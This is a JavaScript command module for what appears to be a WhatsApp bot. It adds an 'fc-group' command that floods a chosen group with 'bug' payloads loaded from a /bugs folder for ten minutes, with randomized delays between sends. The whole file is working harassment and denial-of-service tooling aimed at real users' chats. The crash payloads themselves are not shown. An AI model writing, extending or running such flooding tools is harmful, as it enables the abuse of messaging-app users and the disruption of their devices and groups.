const { cmd } = require('../command');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'fc-group',
  desc: 'Flood a specific group with payloads from /bugs for 10 minutes',
  category: 'bug',
  react: '🧨',
  filename: __filename
}, async (bot, mek, { arg, reply }) => {
  try {
    const groupId = arg?.trim();

    if (!groupId || !groupId.endsWith('@g.us')) {
      return await reply(`❌ Usage:\n.fc-group <group_id>\n\nExample:\n.fc-group 120363418930899468@g.us`);
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await reply('📁 No payloads found in /bugs folder.');
    }

    await reply(`🚨 *Launching flood on group:* ${groupId}\n📦 Payloads: ${bugFiles.length}\n🕒 Duration: 10 minutes`);

    const endTime = Date.now() + 10 * 60 * 1000; // 10 minutes

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(__dirname, '../bugs', file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, to) => {
              await bot.sendMessage(to, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, to) => {
              await bot.sendMessage(to, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, groupId);
          }

        } catch (err) {
          console.error(`❌ Payload error in ${file}:`, err.message);
        }

        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400))); // delay 300–700ms
      }

      await new Promise(res => setTimeout(res, 1000)); // delay 1s ant chak sik
    }

    await bot.sendMessage(groupId, {
      text: '✅ *fc-group flood finished.*'
    });

    await reply('✅ Done! Flood completed.');

  } catch (e) {
    console.error('❌ fc-group error:', e);
    await reply(`❌ Error: ${e.message}`);
  }
});
